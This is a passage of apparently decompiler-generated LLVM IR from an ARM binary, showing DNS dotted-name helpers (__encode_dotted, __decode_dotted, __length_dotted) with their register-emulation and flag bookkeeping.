  br i1 %v9_1ba78, label %dec_label_pc_1ba78._crit_edge, label %dec_label_pc_1ba80

dec_label_pc_1ba78._crit_edge:                    ; preds = %dec_label_pc_1ba78
  %.pre = inttoptr i32 %v0_1bad0 to i8*
  br label %bb8

dec_label_pc_1ba80:                               ; preds = %dec_label_pc_1ba78
  %v1_1ba84 = inttoptr i32 %v0_1bad4 to i8*
  %v2_1ba84 = load i8, i8* %v1_1ba84, align 1
  %v3_1ba84 = zext i8 %v2_1ba84 to i32
  %v1_1ba88 = inttoptr i32 %v0_1bad0 to i8*
  %v2_1ba88 = load i8, i8* %v1_1ba88, align 1
  %v3_1ba88 = zext i8 %v2_1ba88 to i32
  %v2_1ba8c = load i32, i32* bitcast (i32** @global_var_2b590.1381 to i32*), align 4
  %v2_1ba90 = mul nuw nsw i32 %v3_1ba84, 2
  %v2_1ba94 = mul nuw nsw i32 %v3_1ba88, 2
  %v2_1ba98 = add i32 %v2_1ba94, %v2_1ba8c
  %v2_1ba9c = add i32 %v2_1ba8c, %v2_1ba90
  %v1_1baa0 = add i32 %v2_1ba9c, 1
  %v2_1baa0 = inttoptr i32 %v1_1baa0 to i8*
  %v3_1baa0 = load i8, i8* %v2_1baa0, align 1
  %v4_1baa0 = zext i8 %v3_1baa0 to i32
  %v1_1baa4 = add i32 %v2_1ba98, 1
  %v2_1baa4 = inttoptr i32 %v1_1baa4 to i8*
  %v3_1baa4 = load i8, i8* %v2_1baa4, align 1
  %v4_1baa4 = zext i8 %v3_1baa4 to i32
  %v3_1baa8 = inttoptr i32 %v2_1ba98 to i8*
  %v4_1baa8 = load i8, i8* %v3_1baa8, align 1
  %v6_1baa8 = zext i8 %v4_1baa8 to i32
  %v3_1baac = inttoptr i32 %v2_1ba9c to i8*
  %v4_1baac = load i8, i8* %v3_1baac, align 1
  %v6_1baac = zext i8 %v4_1baac to i32
  %v3_1bab0 = mul nuw i32 %v4_1baa4, 16777216
  %v3_1bab4 = mul nuw i32 %v4_1baa0, 16777216
  %v4_1bab8 = sdiv i32 %v3_1bab4, 65536
  %v5_1bab8 = or i32 %v6_1baac, %v4_1bab8
  %v4_1babc = sdiv i32 %v3_1bab0, 65536
  %v5_1babc = or i32 %v4_1babc, %v6_1baa8
  %v2_1bac0 = sub nsw i32 %v5_1bab8, %v5_1babc
  %v9_1bac0 = icmp eq i32 %v5_1bab8, %v5_1babc
  br i1 %v9_1bac0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1ba80
  ret i32 %v2_1bac0

bb8:                                              ; preds = %dec_label_pc_1ba78._crit_edge, %dec_label_pc_1ba80
  %v1_1bac8.pre-phi = phi i8* [ %.pre, %dec_label_pc_1ba78._crit_edge ], [ %v1_1ba84, %dec_label_pc_1ba80 ]
  %v8_1badc = phi i32 [ %v8_1badc3, %dec_label_pc_1ba78._crit_edge ], [ %v2_1bac0, %dec_label_pc_1ba80 ]
  %v2_1bac8 = load i8, i8* %v1_1bac8.pre-phi, align 1
  %v2_1bacc = icmp eq i8 %v2_1bac8, 0
  %v1_1bad0 = add i32 %v0_1bad0, 1
  %v1_1bad4 = add i32 %v0_1bad4, 1
  store i32 %v1_1bad4, i32* @lr, align 4
  br i1 %v2_1bacc, label %dec_label_pc_1badc, label %dec_label_pc_1ba78

dec_label_pc_1badc:                               ; preds = %bb8
  ret i32 %v8_1badc

; uselistorder directives
  uselistorder i32 %v1_1bad4, { 1, 0 }
  uselistorder i32 %v2_1bac0, { 1, 0 }
  uselistorder i32 %v5_1babc, { 1, 0 }
  uselistorder i32 %v5_1bab8, { 1, 0 }
  uselistorder i32 %v0_1bad0, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1bae4 = load i32, i32* @r4, align 4
  store i32 %v3_1bae4, i32* %stack_var_-24, align 4
  %v6_1bae4 = load i32, i32* @r5, align 4
  %v9_1bae4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1baec = load i32, i32* @r1, align 4
  store i32 %v0_1baec, i32* @r6, align 4
  %v0_1baf0 = load i32, i32* @r2, align 4
  store i32 %v0_1baf0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bb5819 = icmp slt i8* %arg1, null
  store i1 %v1_1bb5819, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb5820 = icmp eq i8* %arg1, null
  store i1 %v2_1bb5820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb5820, label %dec_label_pc_1bb70, label %dec_label_pc_1bb64

dec_label_pc_1bafc:                               ; preds = %dec_label_pc_1bb64
  %v2_1bafc = call i32 @__GI_strchr(i32 %v0_1bafc21, i32 46)
  store i32 %v2_1bafc, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bb00 = icmp slt i32 %v2_1bafc, 0
  store i1 %v1_1bb00, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb00 = icmp eq i32 %v2_1bafc, 0
  store i1 %v2_1bb00, i1* %cpsr_z.global-to-local, align 1
  %v0_1bb04 = load i32, i32* @r4, align 4
  %v2_1bb04 = sub i32 %v2_1bafc, %v0_1bb04
  store i32 %v2_1bb04, i32* %ip.global-to-local, align 4
  store i32 %v0_1bb04, i32* %r0.global-to-local, align 4
  br i1 %v2_1bb00, label %dec_label_pc_1bb10, label %dec_label_pc_1bb18

dec_label_pc_1bb10:                               ; preds = %dec_label_pc_1bafc
  %v1_1bb08 = inttoptr i32 %v0_1bb04 to i8*
  %v3_1bb10 = call i32 @strlen(i8* %v1_1bb08)
  store i32 %v3_1bb10, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1bb10, 16777216
  %v1_1bb14 = sdiv i32 %sext, 16777216
  store i32 %v1_1bb14, i32* %ip.global-to-local, align 4
  %v0_1bb24.pre = load i32, i32* @r4, align 4
  %v0_1bb34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1bb18

dec_label_pc_1bb18:                               ; preds = %dec_label_pc_1bafc, %dec_label_pc_1bb10
  %v0_1bb34 = phi i32 [ %v2_1bafc, %dec_label_pc_1bafc ], [ %v0_1bb34.pre, %dec_label_pc_1bb10 ]
  %v0_1bb24 = phi i32 [ %v0_1bb04, %dec_label_pc_1bafc ], [ %v0_1bb24.pre, %dec_label_pc_1bb10 ]
  %v0_1bb44 = phi i32 [ %v2_1bb04, %dec_label_pc_1bafc ], [ %v1_1bb14, %dec_label_pc_1bb10 ]
  %v0_1bb18 = load i32, i32* %r7.global-to-local, align 4
  %v1_1bb18 = add i32 %v0_1bb18, 1
  store i32 %v1_1bb18, i32* @lr, align 4
  %v1_1bb1c = load i32, i32* %r8.global-to-local, align 4
  %v2_1bb1c = sub i32 %v1_1bb1c, %v0_1bb18
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bb20 = icmp slt i32 %v0_1bb44, 0
  store i1 %v1_1bb20, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb20 = icmp eq i32 %v0_1bb44, 0
  store i1 %v2_1bb20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1bb24, i32* @r1, align 4
  %v0_1bb28 = load i32, i32* @r6, align 4
  %v2_1bb28 = add i32 %v0_1bb28, %v1_1bb18
  store i32 %v2_1bb28, i32* @r0, align 4
  store i32 %v0_1bb44, i32* @r2, align 4
  %v1_1bb30 = add i32 %v2_1bb1c, -1
  %v1_1bb34 = add i32 %v0_1bb34, 1
  store i32 %v1_1bb34, i32* @r4, align 4
  br i1 %v2_1bb20, label %.loopexit, label %dec_label_pc_1bb3c

dec_label_pc_1bb3c:                               ; preds = %dec_label_pc_1bb18
  %v2_1bb3c = sub i32 %v0_1bb44, %v1_1bb30
  %v3_1bb3c = icmp ult i32 %v0_1bb44, %v1_1bb30
  %v4_1bb3c = xor i32 %v1_1bb30, %v0_1bb44
  %v5_1bb3c = xor i32 %v2_1bb3c, %v0_1bb44
  %v6_1bb3c = and i32 %v5_1bb3c, %v4_1bb3c
  %v7_1bb3c = icmp slt i32 %v6_1bb3c, 0
  store i1 %v7_1bb3c, i1* %cpsr_v.global-to-local, align 1
  %v8_1bb3c = icmp slt i32 %v2_1bb3c, 0
  store i1 %v8_1bb3c, i1* %cpsr_n.global-to-local, align 1
  %v9_1bb3c = icmp eq i32 %v0_1bb44, %v1_1bb30
  store i1 %v9_1bb3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1bb3c, label %dec_label_pc_1bb44, label %.loopexit

dec_label_pc_1bb44:                               ; preds = %dec_label_pc_1bb3c
  %v1_1bb44 = trunc i32 %v0_1bb44 to i8
  %v4_1bb44 = add i32 %v0_1bb28, %v0_1bb18
  %v5_1bb44 = inttoptr i32 %v4_1bb44 to i8*
  store i8 %v1_1bb44, i8* %v5_1bb44, align 1
  %v0_1bb48 = load i32, i32* @lr, align 4
  %v1_1bb48 = load i32, i32* %ip.global-to-local, align 4
  %v2_1bb48 = add i32 %v1_1bb48, %v0_1bb48
  store i32 %v2_1bb48, i32* %r7.global-to-local, align 4
  %v0_1bb4c = call i32 @memcpy()
  store i32 %v0_1bb4c, i32* %r0.global-to-local, align 4
  %v0_1bb50 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bb50 = icmp slt i32 %v0_1bb50, 0
  store i1 %v1_1bb50, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb50 = icmp eq i32 %v0_1bb50, 0
  store i1 %v2_1bb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb50, label %dec_label_pc_1bb70, label %dec_label_pc_1bb44.dec_label_pc_1bb58_crit_edge

dec_label_pc_1bb44.dec_label_pc_1bb58_crit_edge:  ; preds = %dec_label_pc_1bb44
  %v0_1bb58.pre = load i32, i32* @r4, align 4
  store i32 %v0_1bb58.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bb58 = icmp slt i32 %v0_1bb58.pre, 0
  store i1 %v1_1bb58, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb58 = icmp eq i32 %v0_1bb58.pre, 0
  store i1 %v2_1bb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb58, label %dec_label_pc_1bb70, label %dec_label_pc_1bb64

dec_label_pc_1bb64:                               ; preds = %entry, %dec_label_pc_1bb44.dec_label_pc_1bb58_crit_edge
  %v0_1bafc21 = phi i32 [ %v0_1bb58.pre, %dec_label_pc_1bb44.dec_label_pc_1bb58_crit_edge ], [ %tmp, %entry ]
  %v1_1bb64 = inttoptr i32 %v0_1bafc21 to i8*
  %v2_1bb64 = load i8, i8* %v1_1bb64, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb68 = icmp eq i8 %v2_1bb64, 0
  store i1 %v2_1bb68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb68, label %dec_label_pc_1bb70, label %dec_label_pc_1bafc

dec_label_pc_1bb70:                               ; preds = %dec_label_pc_1bb44.dec_label_pc_1bb58_crit_edge, %dec_label_pc_1bb44, %dec_label_pc_1bb64, %entry
  %v0_1bb70 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bb70 = icmp slt i32 %v0_1bb70, 0
  store i1 %v1_1bb70, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb70 = icmp eq i32 %v0_1bb70, 0
  store i1 %v2_1bb70, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1bb70, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1bb70
  %v5_1bb78 = load i32, i32* %r7.global-to-local, align 4
  %v6_1bb78 = add i32 %v5_1bb78, 1
  store i32 %v6_1bb78, i32* %r0.global-to-local, align 4
  %v7_1bb7c = load i32, i32* @r6, align 4
  %v9_1bb7c = add i32 %v7_1bb7c, %v5_1bb78
  %v10_1bb7c = inttoptr i32 %v9_1bb7c to i8*
  store i8 0, i8* %v10_1bb7c, align 1
  %v0_1bb80.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1bb80.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1bb80.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1bb70, %bb
  %v2_1bb80 = phi i1 [ %v2_1bb80.pre, %bb ], [ false, %dec_label_pc_1bb70 ]
  %v1_1bb80 = phi i1 [ %v1_1bb80.pre, %bb ], [ %v1_1bb70, %dec_label_pc_1bb70 ]
  %v0_1bb80 = phi i1 [ %v0_1bb80.pre, %bb ], [ %v2_1bb70, %dec_label_pc_1bb70 ]
  %v3_1bb80 = xor i1 %v2_1bb80, %v1_1bb80
  %v4_1bb80 = or i1 %v0_1bb80, %v3_1bb80
  br i1 %v4_1bb80, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1bb80 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1bb80, i32* @r4, align 4
  store i32 %v6_1bae4, i32* @r5, align 4
  store i32 %v9_1bae4, i32* @r6, align 4
  %v25_1bb80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1bb80

.loopexit:                                        ; preds = %dec_label_pc_1bb3c, %dec_label_pc_1bb18, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1bb88 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1bb88, i32* @r4, align 4
  store i32 %v6_1bae4, i32* @r5, align 4
  store i32 %v9_1bae4, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1bb70, { 0, 2, 1 }
  uselistorder i32 %v0_1bb58.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1bb50, { 1, 0 }
  uselistorder i32 %v2_1bb3c, { 1, 0 }
  uselistorder i32 %v1_1bb30, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1bb44, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1bb14, { 1, 0 }
  uselistorder i32 %v0_1bb04, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1bb5820, { 1, 0 }
  uselistorder i32 %v9_1bae4, { 1, 0 }
  uselistorder i32 %v6_1bae4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*)* @strlen, { 11, 24, 23, 10, 0, 9, 8, 7, 25, 22, 21, 20, 18, 19, 17, 16, 15, 14, 28, 27, 26, 13, 12, 2, 5, 6, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 8, 7, 6, 15, 14, 13, 12, 5, 4, 3, 2, 11, 10, 9, 1, 0 }
  uselistorder i32 46, { 0, 6, 7, 1, 5, 2, 3, 4 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1bb70, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1bb64, { 1, 0 }
  uselistorder label %dec_label_pc_1bb18, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1bb8c = load i32, i32* @r4, align 4
  %v6_1bb8c = load i32, i32* @r5, align 4
  %v0_1bb90 = load i32, i32* @r0, align 4
  store i32 %v0_1bb90, i32* %sl.global-to-local, align 4
  %v2_1bb90 = icmp eq i32 %v0_1bb90, 0
  br i1 %v2_1bb90, label %.thread16, label %dec_label_pc_1bc30.preheader

.thread16:                                        ; preds = %entry
  %v0_1bb9c1 = load i32, i32* @r2, align 4
  store i32 %v0_1bb9c1, i32* %sb.global-to-local, align 4
  %v0_1bba02 = load i32, i32* @r3, align 4
  store i32 %v0_1bba02, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1bc50

dec_label_pc_1bc30.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1bb9c = load i32, i32* @r2, align 4
  store i32 %v0_1bb9c, i32* %sb.global-to-local, align 4
  %v0_1bba0 = load i32, i32* @r3, align 4
  store i32 %v0_1bba0, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1bc303952 = load i32, i32* @r1, align 4
  %v2_1bc304053 = add i32 %v1_1bc303952, %v0_1bb90
  %v3_1bc304154 = inttoptr i32 %v2_1bc304053 to i8*
  %v4_1bc304255 = load i8, i8* %v3_1bc304154, align 1
  %v6_1bc304356 = zext i8 %v4_1bc304255 to i32
  store i32 %v6_1bc304356, i32* @r4, align 4
  %v2_1bc344457 = icmp eq i8 %v4_1bc304255, 0
  br i1 %v2_1bc344457, label %bb35, label %dec_label_pc_1bbb4.lr.ph

dec_label_pc_1bbb4:                               ; preds = %dec_label_pc_1bbb4.lr.ph, %bb30
  %v2_1bc3c50 = phi i1 [ %v2_1bc3c4663, %dec_label_pc_1bbb4.lr.ph ], [ true, %bb30 ]
  %v6_1bc3048 = phi i32 [ %v6_1bc304361, %dec_label_pc_1bbb4.lr.ph ], [ %v6_1bc30, %bb30 ]
  %v1_1bc3047 = phi i32 [ %v1_1bc303960, %dec_label_pc_1bbb4.lr.ph ], [ %v5_1bbdc, %bb30 ]
  %v1_1bbb8 = and i32 %v6_1bc3048, 192
  br i1 %v2_1bc3c50, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1bbb4
  %v1_1bbbc = load i32, i32* %r8.global-to-local, align 4
  %v2_1bbbc = add i32 %v1_1bbbc, 1
  store i32 %v2_1bbbc, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1bbb4, %bb
  %v2_1bbc0 = icmp eq i32 %v1_1bbb8, 192
  %v1_1bbc4 = add i32 %v1_1bc3047, 1
  store i32 %v1_1bbc4, i32* @r5, align 4
  br i1 %v2_1bbc0, label %dec_label_pc_1bbcc, label %dec_label_pc_1bbec

dec_label_pc_1bbcc:                               ; preds = %bb28
  %v2_1bbcc = add i32 %v1_1bbc4, %v0_1bbcc.ph59
  %v3_1bbcc = inttoptr i32 %v2_1bbcc to i8*
  %v4_1bbcc = load i8, i8* %v3_1bbcc, align 1
  %v6_1bbcc = zext i8 %v4_1bbcc to i32
  %v1_1bbd4 = urem i32 %v6_1bc3048, 64
  br i1 %v2_1bc3c50, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1bbcc
  %v1_1bbd8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bbd8 = add i32 %v1_1bbd8, 1
  store i32 %v2_1bbd8, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1bbcc, %bb29
  %v4_1bbdc = mul nuw nsw i32 %v1_1bbd4, 256
  %v5_1bbdc = or i32 %v6_1bbcc, %v4_1bbdc
  store i32 %v5_1bbdc, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1bc30 = add i32 %v5_1bbdc, %v0_1bbcc.ph59
  %v3_1bc30 = inttoptr i32 %v2_1bc30 to i8*
  %v4_1bc30 = load i8, i8* %v3_1bc30, align 1
  %v6_1bc30 = zext i8 %v4_1bc30 to i32
  store i32 %v6_1bc30, i32* @r4, align 4
  %v2_1bc34 = icmp eq i8 %v4_1bc30, 0
  br i1 %v2_1bc34, label %dec_label_pc_1bc3c.bb36_crit_edge, label %dec_label_pc_1bbb4

dec_label_pc_1bbec:                               ; preds = %bb28
  %v2_1bbec = add i32 %v6_1bc3048, %storemerge17.ph58
  store i32 %v2_1bbec, i32* %r6.global-to-local, align 4
  %v2_1bbf0 = load i32, i32* %stack_var_-40, align 4
  %v1_1bbf4 = add i32 %v2_1bbec, 1
  store i32 %v1_1bbf4, i32* %r7.global-to-local, align 4
  %v3_1bbf8 = icmp ult i32 %v1_1bbf4, %v2_1bbf0
  br i1 %v3_1bbf8, label %dec_label_pc_1bc00, label %dec_label_pc_1bc50

dec_label_pc_1bc00:                               ; preds = %dec_label_pc_1bbec
  %v2_1bc00 = add i32 %v1_1bbc4, %v0_1bbcc.ph59
  store i32 %v2_1bc00, i32* @r1, align 4
  %v0_1bc04 = load i32, i32* %sb.global-to-local, align 4
  %v2_1bc04 = add i32 %v0_1bc04, %storemerge17.ph58
  store i32 %v2_1bc04, i32* @r0, align 4
  store i32 %v6_1bc3048, i32* @r2, align 4
  %v0_1bc0c = call i32 @memcpy()
  %v0_1bc10 = load i32, i32* @r5, align 4
  %v1_1bc10 = load i32, i32* @r4, align 4
  %v2_1bc10 = add i32 %v1_1bc10, %v0_1bc10
  store i32 %v2_1bc10, i32* %r1.global-to-local, align 4
  %v0_1bc14 = load i32, i32* %sl.global-to-local, align 4
  %v2_1bc14 = add i32 %v0_1bc14, %v2_1bc10
  %v3_1bc14 = inttoptr i32 %v2_1bc14 to i8*
  %v4_1bc14 = load i8, i8* %v3_1bc14, align 1
  %v0_1bc18 = load i32, i32* %fp.global-to-local, align 4
  %v2_1bc18 = icmp eq i32 %v0_1bc18, 0
  br i1 %v2_1bc18, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1bc00
  %v1_1bc1c = load i32, i32* %r8.global-to-local, align 4
  %v3_1bc1c = add i32 %v1_1bc1c, %v1_1bc10
  store i32 %v3_1bc1c, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1bc00, %bb31
  %v2_1bc20 = icmp eq i8 %v4_1bc14, 0
  br i1 %v2_1bc20, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1bc28.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1bc28 = load i32, i32* %sb.global-to-local, align 4
  %v3_1bc28 = load i32, i32* %r6.global-to-local, align 4
  %v4_1bc28 = add i32 %v3_1bc28, %v2_1bc28
  %v5_1bc28 = inttoptr i32 %v4_1bc28 to i8*
  store i8 %v0_1bc28.off0, i8* %v5_1bc28, align 1
  %v0_1bc2c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1bc30.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1bc3c.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1bc3039 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bc3040 = add i32 %v1_1bc3039, %v0_1bc30.pre.pre
  %v3_1bc3041 = inttoptr i32 %v2_1bc3040 to i8*
  %v4_1bc3042 = load i8, i8* %v3_1bc3041, align 1
  %v6_1bc3043 = zext i8 %v4_1bc3042 to i32
  store i32 %v6_1bc3043, i32* @r4, align 4
  %v2_1bc3444 = icmp eq i8 %v4_1bc3042, 0
  %v2_1bc3c46 = icmp eq i32 %v0_1bc3c.pre.pre, 0
  br i1 %v2_1bc3444, label %dec_label_pc_1bc3c, label %dec_label_pc_1bbb4.lr.ph

dec_label_pc_1bbb4.lr.ph:                         ; preds = %dec_label_pc_1bc30.preheader, %bb34
  %v2_1bc3c4663 = phi i1 [ %v2_1bc3c46, %bb34 ], [ false, %dec_label_pc_1bc30.preheader ]
  %v6_1bc304361 = phi i32 [ %v6_1bc3043, %bb34 ], [ %v6_1bc304356, %dec_label_pc_1bc30.preheader ]
  %v1_1bc303960 = phi i32 [ %v1_1bc3039, %bb34 ], [ %v1_1bc303952, %dec_label_pc_1bc30.preheader ]
  %v0_1bbcc.ph59 = phi i32 [ %v0_1bc30.pre.pre, %bb34 ], [ %v0_1bb90, %dec_label_pc_1bc30.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1bc2c.pre, %bb34 ], [ 0, %dec_label_pc_1bc30.preheader ]
  br label %dec_label_pc_1bbb4

dec_label_pc_1bc3c:                               ; preds = %bb34
  br i1 %v2_1bc3c46, label %dec_label_pc_1bc3c.bb36_crit_edge, label %bb35

dec_label_pc_1bc3c.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1bc3c
  %v0_1bc44.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bc50

bb35:                                             ; preds = %dec_label_pc_1bc30.preheader, %dec_label_pc_1bc3c
  %v1_1bc40 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc40 = add i32 %v1_1bc40, 1
  store i32 %v2_1bc40, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bc50

dec_label_pc_1bc50:                               ; preds = %dec_label_pc_1bbec, %bb35, %dec_label_pc_1bc3c.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1bc44.pre, %dec_label_pc_1bc3c.bb36_crit_edge ], [ %v2_1bc40, %bb35 ], [ -1, %dec_label_pc_1bbec ]
  store i32 %v3_1bb8c, i32* @r4, align 4
  store i32 %v6_1bb8c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1bbcc.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1bc30, { 1, 0 }
  uselistorder i32 %v5_1bbdc, { 0, 2, 1 }
  uselistorder i32 %v6_1bc3048, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1bc3c50, { 1, 0 }
  uselistorder i32 %v0_1bb90, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 14, 13, 21, 12, 11, 10, 9, 2, 8, 7, 1, 0, 3, 6, 5, 4, 22, 20, 19, 18, 17, 16, 15 }
  uselistorder label %dec_label_pc_1bc50, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1bc3c.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1bbb4.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1bc5c = load i32, i32* @r0, align 4
  store i32 %v0_1bc5c, i32* @lr, align 4
  %v2_1bc5c = icmp eq i32 %v0_1bc5c, 0
  br i1 %v2_1bc5c, label %bb, label %dec_label_pc_1bc74

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1bc6c:                               ; preds = %dec_label_pc_1bc7c
  %v1_1bc6c = add i32 %v1_1bc84, 2
  br label %dec_label_pc_1bc9c

dec_label_pc_1bc74:                               ; preds = %entry
  %v0_1bc74 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1bc84

dec_label_pc_1bc7c:                               ; preds = %dec_label_pc_1bc84
  %v1_1bc90 = and i32 %v6_1bc84, 192
  %v2_1bc94 = add i32 %v6_1bc84, %v1_1bc88
  %v2_1bc7c = icmp eq i32 %v1_1bc90, 192
  br i1 %v2_1bc7c, label %dec_label_pc_1bc6c, label %dec_label_pc_1bc84

dec_label_pc_1bc84:                               ; preds = %dec_label_pc_1bc7c, %dec_label_pc_1bc74
  %v1_1bc84 = phi i32 [ %v2_1bc94, %dec_label_pc_1bc7c ], [ %v0_1bc74, %dec_label_pc_1bc74 ]
  %v2_1bc84 = add i32 %v1_1bc84, %v0_1bc5c
  %v3_1bc84 = inttoptr i32 %v2_1bc84 to i8*
  %v4_1bc84 = load i8, i8* %v3_1bc84, align 1
  %v6_1bc84 = zext i8 %v4_1bc84 to i32
  %v1_1bc88 = add i32 %v1_1bc84, 1
  %v2_1bc8c = icmp eq i8 %v4_1bc84, 0
  br i1 %v2_1bc8c, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc7c

dec_label_pc_1bc9c:                               ; preds = %dec_label_pc_1bc84, %dec_label_pc_1bc6c
